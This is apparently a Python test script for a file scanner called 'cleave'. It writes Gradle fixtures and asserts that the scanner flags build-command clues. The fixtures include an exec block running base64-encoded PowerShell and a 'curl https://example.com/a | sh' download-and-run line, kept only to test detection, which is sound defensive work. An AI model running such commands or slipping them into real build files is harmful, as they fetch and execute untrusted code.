#!/usr/bin/env python3
"""Keep build-command clues without turning calculator text into exploitation."""
import argparse
import json
from pathlib import Path
import subprocess
import tempfile

repo = Path(__file__).resolve().parents[2]
parser = argparse.ArgumentParser(description=__doc__)
parser.add_argument('--cleave', default='../cleave/target/release/cleave')
args = parser.parse_args()
with tempfile.TemporaryDirectory(prefix='gradle-command-') as tmp:
    root = Path(tmp)
    cases = {
        'calc.gradle': 'exec { commandLine "calc.exe" }\n',
        'encoded.gradle': 'exec { commandLine "powershell -e QUJDREVGR0hJSktMTU5PUFFS" }\n',
        'pipeline.gradle': 'println "curl https://example.com/a | sh"\n',
        'name.gradle': 'println "commandLine"\n',
    }
    for name, source in cases.items():(root / name).write_text(source)
    result = subprocess.run(
        [str((repo / args.cleave).resolve()), '--traits-dir', str(repo), '--min-crit', 'component',
         '--format=json', *(str(root / name) for name in cases)],
        check=True, capture_output=True, text=True,
    )
    reports = [json.loads(line)['files'][0] for line in result.stdout.splitlines() if line]
    ids = {Path(r['path']).name: {t['id'] for t in r.get('traits', [])} for r in reports}
    assert set(ids) == set(cases), ids.keys()
    calc = 'metadata/file/profile/staging::exec-block-calculator-clues'
    encoded = 'metadata/file/profile/staging::exec-block-encoded-powershell-clues'
    pipe = 'micro-behaviors/process/create/shell/pipeline::groovy-curl-pipe-shell-text'
    assert calc in ids['calc.gradle'], ids['calc.gradle']
    assert encoded in ids['encoded.gradle'], ids['encoded.gradle']
    assert pipe in ids['pipeline.gradle'], ids['pipeline.gradle']
    for traits in ids.values():
        assert not any(i.startswith('objectives/execution/exploit/build-system::gradle-exec-') for i in traits)
    assert calc not in ids['name.gradle'] and encoded not in ids['name.gradle']
    print('Build command clues remain visible without a bare exploit claim.')
